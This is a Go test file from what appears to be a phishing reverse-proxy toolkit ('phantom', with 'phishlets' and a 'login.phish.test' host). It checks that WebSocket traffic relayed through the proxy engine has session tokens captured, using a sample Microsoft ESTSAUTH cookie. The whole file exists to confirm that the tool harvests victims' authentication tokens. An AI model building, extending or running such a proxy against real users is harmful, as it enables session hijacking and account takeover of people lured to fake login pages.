package proxy

import (
	"context"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/coder/websocket"
	"github.com/phantom-v2/phantom/core/phishlet"
	"github.com/phantom-v2/phantom/core/session"
)

// e2e: клиент WS -> engine -> upstream echo, text с токеном ловится via:ws.
func TestWSInspect(t *testing.T) {
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		c, err := websocket.Accept(w, r, nil)
		if err != nil {
			return
		}
		defer c.Close(websocket.StatusNormalClosure, "")
		for {
			mt, data, err := c.Read(r.Context())
			if err != nil {
				return
			}
			_ = c.Write(r.Context(), mt, append([]byte("echo:"), data...))
		}
	}))
	defer upstream.Close()

	st := phishlet.NewStore()
	if err := st.LoadDir("../../configs/phishlets"); err != nil {
		t.Fatal(err)
	}
	tap := newTap()
	eng := New(st, session.NewMemory(0), tap)
	eng.SetUpstream(map[string]string{"origin.upstream.test": upstream.URL})

	proxySrv := httptest.NewServer(eng)
	defer proxySrv.Close()
	wsURL := "ws" + strings.TrimPrefix(proxySrv.URL, "http")

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	client, _, err := websocket.Dial(ctx, wsURL+"/chat", &websocket.DialOptions{
		HTTPHeader: http.Header{"User-Agent": {"Mozilla/5.0"}},
		Host:       "login.phish.test",
	})
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer client.Close(websocket.StatusNormalClosure, "")

	// Обычный фрейм — эхо.
	if err := client.Write(ctx, websocket.MessageText, []byte("hello")); err != nil {
		t.Fatal(err)
	}
	_, data, err := client.Read(ctx)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(data), "hello") {
		t.Fatalf("echo lost: %q", data)
	}
	// Фрейм с токеном — эхо + capture.token via:ws.
	if err := client.Write(ctx, websocket.MessageText, []byte(`{"auth":"ESTSAUTH=abc"}`)); err != nil {
		t.Fatal(err)
	}
	_, _, err = client.Read(ctx)
	if err != nil {
		t.Fatal(err)
	}
	n := tap.count("capture.token")
	if n < 1 {
		t.Fatalf("ws token not captured (have %d)", n)
	}
}
